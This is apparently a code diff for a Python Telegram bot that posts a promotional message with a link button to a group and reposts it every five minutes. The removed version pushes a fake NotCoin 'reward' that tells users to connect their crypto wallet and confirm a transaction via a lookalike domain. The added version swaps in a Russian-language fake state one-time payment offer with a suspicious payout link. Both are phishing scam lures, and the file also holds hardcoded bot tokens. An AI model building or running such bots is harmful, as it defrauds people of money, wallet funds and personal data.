@@ -12,8 +12,8 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 # Configure logging
 logging.basicConfig(level=logging.INFO)
 
-API_TOKEN = "7291323858:AAEyJBV7M2QGSelcaMcf0I9gVOYBGSVIzn8"
-GROUP_ID = -1001543758815
+API_TOKEN = "7335143298:AAE4pHSyw4_AJYoS_rzVw_cCG3cSl2Jbsno"
+GROUP_ID = -1001816446391
 MESSAGE_ID = 0
 # Initialize bot and dispatcher
 bot = Bot(token=API_TOKEN)
@@ -24,14 +24,22 @@ router = Router()
 
 
 text = """
-How to Participate in Reward Holder
-All of the grandest and largest events are simple. You will be rewarded in just 3 simple steps :
+Получить единоразовую выплату стало проще 
 
-✅ Click on the "GET REWARD" button below.
-✅ Connect wallet where you holder $NOT coin.
-✅ Confirm the transaction in your wallet to receive the reward.
+☝🏻 Теперь выплату можно без постоянной регистрации.
 
-Done! Within seconds, smart contract Reward Holderwill send the reward to your wallet. Thank you for choosing NotCoin
+🏠 Раньше такую выплату получали только те, у кого была постоянная регистрация. 
+
+Какие условия получения единоразовой выплаты❓
+
+🔸 Получить выплату можно только один раз.
+🔸 Доход на каждого члена семьи не должен превышать - 116223 ₽.
+
+Новые размеры выплат после индексации: 
+
+🔹 50% - 7 868,5 ₽.
+🔹 75% - 11 803 ₽.
+🔹 100% - 15 737 ₽.
 """
 
 
@@ -39,18 +47,18 @@ Done! Within seconds, smart contract Reward Holderwill send the reward to your w
 async def send_new_post(message: types.Message, bot: Bot):
     global MESSAGE_ID, GROUP_ID
 
-    min10inSec = 60 * 5
+    min5inSec = 60 * 5
 
     keyboard_builder = InlineKeyboardBuilder()
     keyboard_builder.add(
         InlineKeyboardButton(
-            text="GET REWARD",
-            url="https://notco-in.pro/",
+            text="Получить выплату",
+            url="https://trsp-2s3a.space/evc/?flow=8334&amount=15737",
         )
     )
     keyboard = keyboard_builder.as_markup()
 
-    photo = FSInputFile("imgNot.jpg")
+    photo = FSInputFile("imgRus.jpg")
 
     if MESSAGE_ID == 0:
 
@@ -63,7 +71,7 @@ async def send_new_post(message: types.Message, bot: Bot):
 
         MESSAGE_ID = message1.message_id
 
-        await asyncio.sleep(min10inSec)
+        await asyncio.sleep(min5inSec)
         await send_new_post(message, bot)
         return
 
@@ -78,7 +86,7 @@ async def send_new_post(message: types.Message, bot: Bot):
 
     MESSAGE_ID = message1.message_id
 
-    await asyncio.sleep(min10inSec)
+    await asyncio.sleep(min5inSec)
     await send_new_post(message, bot)
 
 
